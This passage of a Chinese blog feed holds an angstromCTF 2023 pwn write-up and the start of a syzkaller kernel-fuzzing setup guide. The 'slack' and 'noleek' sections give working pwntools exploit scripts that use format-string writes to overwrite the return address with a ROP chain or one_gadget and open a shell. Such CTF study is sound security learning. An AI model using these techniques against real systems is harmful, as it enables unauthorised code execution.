0x7ffe27708f28 ◂— 0x1109c51ee9704900 22:0110│ 0x7ffe27708f30 ◂— 0x0 23:0118│ 0x7ffe27708f38 —▸ 0x7ff6be4eee40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1ef159] 24:0120│ 0x7ffe27708f40 —▸ 0x7ffe27708fb8 —▸ 0x7ffe2770a8e9 ◂— 'LESSOPEN=| /usr/bin/lesspipe %s' 25:0128│ 0x7ffe27708f48 —▸ 0x55e493195d60 (__do_global_dtors_aux_fini_array_entry) —▸ 0x55e493193280 (__do_global_dtors_aux) ◂— endbr64 26:0130│ 0x7ffe27708f50 —▸ 0x7ff6be72f2e0 —▸ 0x55e493192000 ◂— 0x10102464c457f 27:0138│ 0x7ffe27708f58 ◂— 0x0 28:0140│ 0x7ffe27708f60 ◂— 0x0 29:0148│ 0x7ffe27708f68 —▸ 0x55e4931931e0 (_start) ◂— endbr64 2a:0150│ 0x7ffe27708f70 —▸ 0x7ffe27708fa0 ◂— 0x1 2b:0158│ 0x7ffe27708f78 ◂— 0x0 2c:0160│ 0x7ffe27708f80 ◂— 0x0 2d:0168│ 0x7ffe27708f88 —▸ 0x55e493193205 (_start+37) ◂— hlt 2e:0170│ 0x7ffe27708f90 —▸ 0x7ffe27708f98 ◂— 0x1c 2f:0178│ 0x7ffe27708f98 ◂— 0x1c 30:0180│ 0x7ffe27708fa0 ◂— 0x1 31:0188│ r12 0x7ffe27708fa8 —▸ 0x7ffe2770a8dd ◂— '/chal/slack' &lt;---[2]修改其值，让他指向变量i 因为上面stack命令的结果中，序号是从0开始的，所以，选择的第一个地址的偏移是 0x13+1+5=25，第二个地址的偏移是0x31+1+5=55： ------------------ 0x7ffe27708e28 01 i 【2】&quot;%255c%55$hn&quot; ：修改i的最高一个字节为0xff ------------------ ...... ------------------ 0x7ffe27708eb8 25 0x7ffe27708fa8 ------------------ ...... ------------------0x7ffe27708fa8 55 0x7ffe2770a8dd 【1】f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot; ：将0x7ffe2770a8dd变成0x7ffe27708e2B 为什么%25$hn改变的是0x7ffe2770a8dd，而不是0x7ffe27708fa8？ 因为%n对应的参数是个地址，比如：printf(&quot;testtest %n\\n&quot;, &amp;c); 这里%n对应的参数就是&amp;c，而上面的例子中，对应的参数就是0x7ffe27708fa8，改变的内容自然就是0x7ffe2770a8dd了。 对应脚本如下： # step2: set i to some negative number i_addr = main_ret_addr - (0x68+8) leak(&quot;i_addr&quot;, i_addr) #dbg() print(f&quot;%{hex(i_addr + 3)}&quot;) # 变量i最高一个字节的地址 print(f&quot;%{hex((i_addr + 3) &amp; 0xffff)}&quot;) # 变量i最高一个字节的地址的最低2字节 sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;) # 将这两字节写入到栈上某个值，令这个值变成 变量i的地址 sla(b&quot;): &quot;, b&quot;%255c%55$hn&quot;) # 将0xff写入到变量i内容的最高1字节 # dbg() itr() 结果如下，确实变成了一个绝对值很大的负数： 5.3.3 覆写main_ret为rop链 同样因为输入长度限制的原因，覆写main_ret的方法和覆写i的方法一样： # step3: overwrite return address with rop rop = ROP(libc) rop.raw(rop.find_gadget([&quot;ret&quot;])) rop.system(next(libc.search(b&quot;/bin/sh&quot;))) chain = rop.chain() # 构造rop链 # print(&quot;=======&quot;) # print(rop.dump()) # one_gadget = libc.address + 0x50A37 # print(f&quot;{hex(one_gadget)=}&quot;) for i in range(len(rop.chain())): payload = chain[i] out = f&quot;%{(main_ret_addr + i) &amp; 0xffff}c%25$hn&quot; print(f&quot;{i=} {out=}&quot;) sa(b&quot;): &quot;, out.encode()) #修改offset=55处的内容为ret地址 if payload == 0: out = f&quot;%55$hhn&quot; print(f&quot;{i=} {out=}&quot;) else: out = f&quot;%{payload}c%55$hhn&quot; print(f&quot;{i=} {out=}&quot;) sla(b&quot;): &quot;, out) # 一字节一字节地覆写ret sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;) sla(b&quot;): &quot;, b&quot;%55$hhn&quot;) # 把i改回来，不然会卡在循环里 itr() 5.4 exp from pwn import * import warnings import subprocess warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # 【注意】加上架构信息，不然rop模块会把该程序当成32位程序 context.log_level = 'DEBUG' # context.log_level = 'CRITICAL' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] def dbg(): gdb.attach(p) # pause() elf = ELF(&quot;./slack&quot;) p = process(&quot;./slack&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # for i in range(0x10): # p = process(&quot;./slack&quot;) # sla(b&quot;): &quot;, f&quot;%{i}$p&quot;) # ru(&quot;You: &quot;) # data = rl().strip() # print(f&quot;{i=} {data=}&quot;) # p.close() # step1: leak stack/libc sla(b&quot;): &quot;, &quot;%1$p %9$p&quot;) ru(&quot;You: &quot;) data = rl().strip().decode().split() some_stack_addr = data[0] some_libc_addr = data[1] logsucc(&quot;some_stack_addr = &quot; + some_stack_addr) logsucc(&quot;some_libc_addr = &quot; + some_libc_addr) main_ret_addr = int(some_stack_addr,16) + (0x7ffc8fb1e328 - 0x7ffc8fb1c190) libc_base_addr = int(some_libc_addr,16) + (0x7f35e31bf000 - 0x7f35e33df6a0) libc.address = libc_base_addr leak(&quot;main_ret_addr&quot;, main_ret_addr) leak(&quot;libc_base_addr&quot;, libc_base_addr) # dbg() # step2: set i to some negative number i_addr = main_ret_addr - (0x68+8) leak(&quot;i_addr&quot;, i_addr) # dbg() print(f&quot;%{hex(i_addr + 3)}&quot;) # 变量i最高一个字节的地址 print(f&quot;%{hex((i_addr + 3) &amp; 0xffff)}&quot;) # 变量i最高一个字节的地址的最低2字节 sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;) # 将这两字节写入到栈上某个值，令这个值变成 变量i的地址 （此处发送的数据极容易达到13个字节，比如b'%54603c%25$hn'。因此应该用sa，而不要用sla，否则在缓冲区里还存着一个\\x00，下一行再次发送数据的时候会导致错误） sla(b&quot;): &quot;, b&quot;%255c%55$hn&quot;) # 将0xff写入到变量i内容的最高1字节 # dbg() # step3: overwrite return address with rop rop = ROP(libc) rop.raw(rop.find_gadget([&quot;ret&quot;])) rop.system(next(libc.search(b&quot;/bin/sh&quot;))) chain = rop.chain() # 构造rop链 # print(&quot;=======&quot;) # print(rop.dump()) # one_gadget = libc.address + 0x50A37 # print(f&quot;{hex(one_gadget)=}&quot;) for i in range(len(rop.chain())): payload = chain[i] out = f&quot;%{(main_ret_addr + i) &amp; 0xffff}c%25$hn&quot; print(f&quot;{i=} {out=}&quot;) sa(b&quot;): &quot;, out.encode()) #修改offset=55处的内容为ret地址 if payload == 0: out = f&quot;%55$hhn&quot; print(f&quot;{i=} {out=}&quot;) else: out = f&quot;%{payload}c%55$hhn&quot; print(f&quot;{i=} {out=}&quot;) sla(b&quot;): &quot;, out) # 一字节一字节地覆写ret # 下面尝试写了写 直接覆写ret，当然因为输入长度限制的原因，肯定是不能成功的。 # for i in range(len(rop.chain())): # payload = chain[i] # # print(payload) # if payload == 0: # 写入0 # out = f&quot;%22$hnnA&quot;.encode() + p64(main_ret_addr + i) # print(f&quot;{i=} {out=}&quot;) # else: # payload2 = payload - 8 # out = p64(main_ret_addr + i) + f&quot;%{payload2}c%21$hnn&quot;.encode() # print(f&quot;{i=} {out=}&quot;) # # out = f&quot;%{payload}c%21$hhn&quot; # 0xf+1+5=21 # sa(b&quot;): &quot;, out) # dbg() sa(b&quot;): &quot;, f&quot;%{(i_addr + 3) &amp; 0xffff}c%25$hn&quot;) sla(b&quot;): &quot;, b&quot;%55$hhn&quot;) # 把i改回来，不然会卡在循环里 itr() # exit(0) 注意sa 和 sla 的问题，见注释。 6 noleek My code had a couple of pesky format string vulnerabilities that kept getting exploited...I'm sure it'll fix itself if I just compile with RELRO and take away output... 题目说明很清楚，存在格式化字符串漏洞，但是使用 RELRO 进行编译并删除了输出。 注意做题环境，这道题的环境是debian@sha256:98......，我一开始用ubuntu22做题，调试的时候执行到fprintf过不去，会崩掉。 Dockerfile如下： FROM pwn.red/jail COPY --from=debian@sha256:98d3b4b0cee264301eb1354e0b549323af2d0633e1c43375d0b25c01826b6790 / /srv COPY noleek /srv/app/run COPY flag.txt /srv/app/flag.txt RUN chmod 755 /srv/app/run 6.1 运行分析 有源码，先看看源码。如下所示，两次输入，然后输出不再是给stdout，而是给了/dev/null #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define LEEK 32 void cleanup(int a, int b, int c) {} int main(void) { setbuf(stdout, NULL); FILE* leeks = fopen(&quot;/dev/null&quot;, &quot;w&quot;); if (leeks == NULL) { puts(&quot;wtf&quot;); return 1; } printf(&quot;leek? &quot;); char inp[LEEK]; fgets(inp, LEEK, stdin); // 往长度为32的栈buffer输入数据 fprintf(leeks, inp); // 把输入输出到/dev/null，格式化字符串漏洞 printf(&quot;more leek? &quot;); fgets(inp, LEEK, stdin); // 再次输入 fprintf(leeks, inp); // 格式化字符串漏洞 printf(&quot;noleek.\\n&quot;); cleanup(0, 0, 0); return 0; } fprintf函数原型： //发送格式化输出到流 stream 中 int fprintf(FILE *stream, const char *format, ...) // 正常使用 fprintf(fp, &quot;%s %s %s %d&quot;, &quot;We&quot;, &quot;are&quot;, &quot;in&quot;, 2014); 关闭Canary，RELRO是Full RELRO。 root@429d186baf6b:/chal# ./noleek leek? aaa more leek? aaa noleek. root@429d186baf6b:/chal# root@429d186baf6b:/chal# checksec noleek [*] '/chal/noleek' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled 这道题没有输出，也就不能泄露地址了。利用思路参考上一题，不过区别是本题利用%*c来修改栈里存储的某个指针的低4字节（为什么是4字节？见下面），使其指向存储main_ret的地方。 格式化字符串中*的作用 星号在 printf 格式化字符串中的作用是用于指定动态宽度或精度。在输出字符串时，星号可以通过传递另一参数（ int 类型）的方式动态定义输出的宽度或精度。测试格式化字符串中 * 的作用： #include&lt;stdio.h&gt; void main(){ printf(&quot;%*c&quot;, 5, '*');// 输出一个星号字符 '*'，并指定宽度为 5 printf(&quot;\\n&quot;); printf(&quot;%.*f&quot;, 2, 3.14159); printf(&quot;\\n&quot;); } 第一个输出结果：在宽度为 5 的位置上输出星号字符 第二个输出结果：星号指定了精度为 2，输出结果保留两位小数 root@429d186baf6b:/chal# ./a.out * 3.14 6.2 调试 gdb调试，输入AAAAAAAA.%p.%p.%p.%p。 存储main_ret的地址是0x7ffc6faf3498 rsi，也就是fprintf第二个参数inp的地址是0x7ffc6faf3460 fprintf第三个参数vararg的值和rsi一致，也是0x7ffc6faf3460 和上一题一样，在栈里找一个存储了栈地址的地方，算出其偏移（fprintf格式化字符串参数之后的第几个参数） pwndbg&gt; stack 30 00:0000│ rdx rsi r8 rsp 0x7ffc6faf3460 ◂— 'AAAAAAAA.%p.%p.%p.%p\\n' 01:0008│ 0x7ffc6faf3468 ◂— '.%p.%p.%p.%p\\n' 02:0010│ 0x7ffc6faf3470 ◂— 0xa70252e70 /* 'p.%p\\n' */ 03:0018│ 0x7ffc6faf3478 —▸ 0x55cc237c30a0 (_start) ◂— xor ebp, ebp 04:0020│ 0x7ffc6faf3480 —▸ 0x7ffc6faf3580 ◂— 0x1 05:0028│ 0x7ffc6faf3488 —▸ 0x55cc242652a0 ◂— 0xfbad2484 06:0030│ rbp 0x7ffc6faf3490 —▸ 0x55cc237c3290 (__libc_csu_init) ◂— push r15 07:0038│ 0x7ffc6faf3498 —▸ 0x7f3cd6c26d0a (__libc_start_main+234) ◂— mov edi, eax #[1]main_ret 08:0040│ 0x7ffc6faf34a0 —▸ 0x7ffc6faf3588 —▸ 0x7ffc6faf4f0c ◂— '/chal/noleek' # [2] 09:0048│ 0x7ffc6faf34a8 ◂— 0x100000000 0a:0050│ 0x7ffc6faf34b0 —▸ 0x55cc237c3195 (main) ◂— push rbp 0b:0058│ 0x7ffc6faf34b8 —▸ 0x7f3cd6c267cf (init_cacheinfo+287) ◂— mov rbp, rax 0c:0060│ 0x7ffc6faf34c0 ◂— 0x0 0d:0068│ 0x7ffc6faf34c8 ◂— 0x8863beef03c1ee55 0e:0070│ 0x7ffc6faf34d0 —▸ 0x55cc237c30a0 (_start) ◂— xor ebp, ebp 0f:0078│ 0x7ffc6faf34d8 ◂— 0x0 ... ↓ 2 skipped 12:0090│ 0x7ffc6faf34f0 ◂— 0xdc0327490fa1ee55 13:0098│ 0x7ffc6faf34f8 ◂— 0xdd825593bf67ee55 14:00a0│ 0x7ffc6faf3500 ◂— 0x0 ... ↓ 2 skipped 17:00b8│ 0x7ffc6faf3518 ◂— 0x1 18:00c0│ 0x7ffc6faf3520 —▸ 0x7ffc6faf3588 —▸ 0x7ffc6faf4f0c ◂— '/chal/noleek' # [3] 19:00c8│ 0x7ffc6faf3528 —▸ 0x7ffc6faf3598 —▸ 0x7ffc6faf4f19 ◂— 'HOSTNAME=cb420c074f1e' 1a:00d0│ 0x7ffc6faf3530 —▸ 0x7f3cd6e0b180 —▸ 0x55cc237c2000 ◂— 0x10102464c457f 1b:00d8│ 0x7ffc6faf3538 ◂— 0x0 1c:00e0│ 0x7ffc6faf3540 ◂— 0x0 1d:00e8│ 0x7ffc6faf3548 —▸ 0x55cc237c30a0 (_start) ◂— xor ebp, ebp 偏移： [2] 8+1+4=13 [3] 0x18+1+4=29 加4是因为这里格式化字符串是第二个参数了 如果选[2]这个偏移，格式化字符串可以这样写： %*c%13$hn 在上面调试记录中，fprintf第三个参数vararg是0x7ffc6faf3460，所以%*c对应的整型值是0x6faf3460。所以，发送payload后，会将地址0x7ffc6faf3588里的内容0x7ffc6faf4f0c改成0x7ffc6faf3460。 而我们的目的是将地址0x7ffc6faf3588里的内容改成存储main_ret的地址，因此还需要计算0x7ffc6faf3460和addr(main_ret)的偏移： pwndbg&gt; p/x 0x7ffc6faf3498-0x7ffc6faf3460 $1 = 0x38 其实这里有个隐含要求，就是addr(main_ret)需要大于vararg，因为我们只能在vararg低4Byte的基础上再加字符，好在题目里是满足的。 修改格式化字符串: %*c%56c%13$hn 下面调试查看结果： call fprintf前： call fprintf后： 0x7ffe48560ed8对于fprintf函数来说，是格式化字符串参数后的第42个参数。 pwndbg&gt; p (0x7ffe48560ed8-0x7ffe48560db0)/8+1+4 $2 = 42 现在第42个参数已经改成了main_ret的存放地址，那么接下来就是将其改成gadget的地址。 现在栈里找一个距离libc地址近的地址，第16个参数就可以： 0b:0058│ 0x7ffe48560e08 —▸ 0x7fa20b7e57cf (init_cacheinfo+287) ◂— mov rbp, rax pwndbg&gt; vmmap LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA Start End Perm Size Offset File 0x560a5c98a000 0x560a5c98b000 r--p 1000 0 /chal/noleek 0x560a5c98b000 0x560a5c98c000 r-xp 1000 1000 /chal/noleek 0x560a5c98c000 0x560a5c98d000 r--p 1000 2000 /chal/noleek 0x560a5c98d000 0x560a5c98e000 r--p 1000 2000 /chal/noleek 0x560a5c98e000 0x560a5c98f000 rw-p 1000 3000 /chal/noleek 0x560a5e5ef000 0x560a5e610000 rw-p 21000 0 [heap] 0x7fa20b7c2000 0x7fa20b7e4000 r--p 22000 0 /lib/x86_64-linux-gnu/libc-2.31.so 0x7fa20b7e4000 0x7fa20b93d000 r-xp 159000 22000 /lib/x86_64-linux-gnu/libc-2.31.so 0x7fa20b93d000 0x7fa20b98c000 r--p 4f000 17b000 /lib/x86_64-linux-gnu/libc-2.31.so 0x7fa20b98c000 0x7fa20b990000 r--p 4000 1c9000 /lib/x86_64-linux-gnu/libc-2.31.so 0x7fa20b990000 0x7fa20b992000 rw-p 2000 1cd000 /lib/x86_64-linux-gnu/libc-2.31.so 0x7fa20b992000 0x7fa20b998000 rw-p 6000 0 [anon_7fa20b992] 0x7fa20b99e000 0x7fa20b99f000 r--p 1000 0 /lib/x86_64-linux-gnu/ld-2.31.so 0x7fa20b99f000 0x7fa20b9bf000 r-xp 20000 1000 /lib/x86_64-linux-gnu/ld-2.31.so 0x7fa20b9bf000 0x7fa20b9c7000 r--p 8000 21000 /lib/x86_64-linux-gnu/ld-2.31.so 0x7fa20b9c8000 0x7fa20b9c9000 r--p 1000 29000 /lib/x86_64-linux-gnu/ld-2.31.so 0x7fa20b9c9000 0x7fa20b9ca000 rw-p 1000 2a000 /lib/x86_64-linux-gnu/ld-2.31.so 0x7fa20b9ca000 0x7fa20b9cb000 rw-p 1000 0 [anon_7fa20b9ca] 0x7ffe48541000 0x7ffe48562000 rw-p 21000 0 [stack] 0x7ffe485bd000 0x7ffe485c1000 r--p 4000 0 [vvar] 0x7ffe485c1000 0x7ffe485c3000 r-xp 2000 0 [vdso] 0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] 再看看它和one_gadget之间的偏移是多少：0xa4a91 root@d3b03dc58069:/chal# one_gadget /lib/x86_64-linux-gnu/libc-2.31.so 0xc825a execve(&quot;/bin/sh&quot;, r12, r13) constraints: [r12] == NULL || r12 == NULL [r13] == NULL || r13 == NULL 0xc825d execve(&quot;/bin/sh&quot;, r12, rdx) constraints: [r12] == NULL || r12 == NULL [rdx] == NULL || rdx == NULL 0xc8260 execve(&quot;/bin/sh&quot;, rsi, rdx) constraints: [rsi] == NULL || rsi == NULL [rdx] == NULL || rdx == NULL pwndbg&gt; p/x (0x7fa20b7c2000+0xc8260)-0x7fa20b7e57cf $4 = 0xa4a91 pwndbg&gt; p 0xa4a91 $5 = 674449 这里选的是第三个gadget，因为main函数返回前将rsi和rdx清零了，满足第三个gadget的constraints： 输入下面的格式化字符串，先打印第16个参数低4字节（0x0b7e57cf）个字符，然后打印674449个参数，最后它两之和（也就是one_gadget真实地址的低4字节）覆写第42个参数的低4字节，即将main_ret（0x7fa20b7e5d0a）修改为one_gadget的地址，最终拿到shell。 回顾一下格式化占位符（format placeholder）的语法： %[parameter][flags][field width][.precision][length]type Parameter可以忽略或者是n$：n是用这个格式说明符（specifier）显示第几个参数 %*16$c%674449c%42$n 分开解读： %*16$c 打印第16个参数低4Byte个字符（这个16$和后面的42$是一个概念） %674449c 打印674449个字符 %42$n 将前面打印的字符数写入第42个参数 6.3 exp %*c%56c%13$hn %*16$c%674449c%42$n 不是每次都能成功，调试过程中我发现有时候输入以后，它会把第13个参数改成一个不知道是什么的数字。这时候我会重新输入%*c%13$hn，然后多试几次就ok。所以如果写成python脚本，也是用一个死循环来多试几次： from pwn import * import warnings import subprocess warnings.filterwarnings(action='ignore', category=BytesWarning) s = lambda data :p.send(data) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) ruf = lambda delims, drop=False :p.recvuntil(delims, drop) rl = lambda drop=True :p.recvline(drop) rlf = lambda drop=False :p.recvline(drop) uu64 = lambda data :u64(data.ljust(8,'\\x00')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) logsucc = lambda info :log.success(info) itr = lambda :p.interactive() context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序 context.log_level = 'DEBUG' # context.log_level = 'CRITICAL' #context.terminal=['tmux', 'spilit-window', '-h'] context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P'] def dbg(): gdb.attach(p) # pause() elf = ELF(&quot;./noleek&quot;) libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.31.so&quot;) while True: try: p = process(&quot;./noleek&quot;) # gdb.attach(p, &quot;&quot;&quot;b *(main+140)&quot;&quot;&quot;) # payload = f'%*c%29$hn' payload = f'%*c%{0x38}c%13$hn'.encode() sla(b&quot;leek? &quot;, payload) payload = f'%*16$c%{0xa4a91}c%42$n'.encode() sla(b&quot;more leek? &quot;, payload) ru(b'noleek.\\n') sl(b'cat flag.txt') flag = rl() print(flag) except: p.close() continue break itr() 7 Sailor's Revenge After the sailors were betrayed by their trusty anchor, they rewrote their union smart contract to be anchor-free! They even added a new registration feature so you can show off your union registration on the blockchain! 智能合约，不会，正打算学这个。后面再补这题吧。 小结 这些题主要是栈溢出和格式化字符串漏洞 对于输入有长度限制的时候，注意sendlineafter和sendafter，不然容易卡在这个小细节里。 格式化字符串，网上稍微搜了搜，还是维基百科介绍得最详细。 参考文献 https://www.youtube.com/watch?v=jqF4Sgi4Ars https://zh.m.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2 https://github.com/nhtri2003gmail/CTFWriteup/blob/5b229bc581e7474f67de0617cb4fc40fbb20e70d/2023/angstromCTF/noleek/README.md ","link":"https://lzxzl.github.io/post/angstromctf2023-pwn/"},{"title":"syzkaller使用-Linux","content":"1 环境准备 前提：支持kvm 宿主机OS版本： ztree@ubuntu2:~$ lsb_release -a No LSB modules are available. Distributor ID: Ubuntu Description: Ubuntu 22.04.2 LTS Release: 22.04 Codename: jammy 1.1 安装软件依赖 sudo apt update sudo apt-get install debootstrap sudo apt install qemu-kvm sudo apt-get install subversion sudo apt-get install git sudo apt-get install make sudo apt-get install qemu sudo apt install libssl-dev libelf-dev sudo apt-get install flex bison libc6-dev libc6-dev-i386 linux-libc-dev linux-libc-dev:i386 libgmp3-dev libmpfr-dev libmpc-dev sudo apt-get install g++ sudo apt-get install build-essential sudo apt install gcc sudo apt install openssh-server 因为我后面还要将syzkaller用于fuzz Android，所以还要安装交叉编译工具： sudo apt install gcc-aarch64-linux-gnu sudo apt install g++-aarch64-linux-gnu 1.2 安装golang环境 参考go官网：https://go.dev/doc/install # 安装当前最新版 ztree@ubuntu2:~$ cd Downloads/ ztree@ubuntu2:~/Downloads$ proxychains4 wget https://go.dev/dl/go1.20.5.linux-amd64.tar.gz # 解压到/usr/local/go sudo rm -rf /usr/local/go &amp;&amp; sudo tar -C /usr/local -xzf go1.20.5.linux-amd64.tar.gz # 配置环境变量 sudo vim /etc/profile # 写入 export PATH=$PATH:/usr/local/go/bin # 使生效 source /etc/profile # 检查是否安装成功 ztree@ubuntu2:~$ go version go version go1.20.5 linux/amd64 1.3 设置golang工作目录 # 创建工作目录 ztree@ubuntu2:~/fuzz/kernel$ mkdir gopath # 配置环境变量 ztree@ubuntu2:~/fuzz/kernel$ sudo vim /etc/profile # 写入 export PATH=$PATH:/home/ztree/fuzz/kernel/gopath # 使生效 ztree@ubuntu2:~/fuzz/kernel$ source /etc/profile 1.4 编译syzkaller # 后续syzkaller的源码需要放在工作目录下的这个子目录下 ztree@ubuntu2:~/fuzz/kernel/gopath$ mkdir -p github.com/google ztree@ubuntu2:~/fuzz/kernel/gopath$ cd github.com/google ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google$ git clone https://github.com/google/syzkaller.git # git clone https://gitclone.com/github.com/google/syzkaller.git ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google$ cd syzkaller # 编译linux-amd64架构的syzkaller ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ make go list -f '{{.Stale}}' ./sys/syz-sysgen | grep -q false || go install ./sys/syz-sysgen make .descriptions bin/syz-sysgen touch .descriptions GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-manager github.com/google/syzkaller/syz-manager GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-runtest github.com/google/syzkaller/tools/syz-runtest GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-repro github.com/google/syzkaller/tools/syz-repro GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-mutate github.com/google/syzkaller/tools/syz-mutate GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-prog2c github.com/google/syzkaller/tools/syz-prog2c GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-db github.com/google/syzkaller/tools/syz-db GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-upgrade github.com/google/syzkaller/tools/syz-upgrade GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; &quot;-tags=syz_target syz_os_linux syz_arch_amd64 &quot; -o ./bin/linux_amd64/syz-fuzzer github.com/google/syzkaller/syz-fuzzer GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; &quot;-tags=syz_target syz_os_linux syz_arch_amd64 &quot; -o ./bin/linux_amd64/syz-execprog github.com/google/syzkaller/tools/syz-execprog GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; &quot;-tags=syz_target syz_os_linux syz_arch_amd64 &quot; -o ./bin/linux_amd64/syz-stress github.com/google/syzkaller/tools/syz-stress mkdir -p ./bin/linux_amd64 gcc -o ./bin/linux_amd64/syz-executor executor/executor.cc \\ -m64 -O2 -pthread -Wall -Werror -Wparentheses -Wunused-const-variable -Wframe-larger-than=16384 -static -DGOOS_linux=1 -DGOARCH_amd64=1 \\ -DHOSTGOOS_linux=1 -DGIT_REVISION=\\&quot;6a383ecfb767c80c9fa63c7708b25e568a4ebfec\\&quot; # 查看编译结果 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ ls bin linux_amd64 syz-db syz-manager syz-mutate syz-prog2c syz-repro syz-runtest syz-sysgen syz-upgrade # bin/linux_amd64/是linux-amd64架构的一些二进制程序 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ ls bin/linux_amd64/ syz-execprog syz-executor syz-fuzzer syz-stress # 编译linux-arm64架构的syzkaller（for Android） ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ make TARGETOS=linux TARGETARCH=arm64 go list -f '{{.Stale}}' ./sys/syz-sysgen | grep -q false || go install ./sys/syz-sysgen make .descriptions make[1]: '.descriptions' is up to date. GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-manager github.com/google/syzkaller/syz-manager GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-runtest github.com/google/syzkaller/tools/syz-runtest GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-repro github.com/google/syzkaller/tools/syz-repro GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-mutate github.com/google/syzkaller/tools/syz-mutate GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X 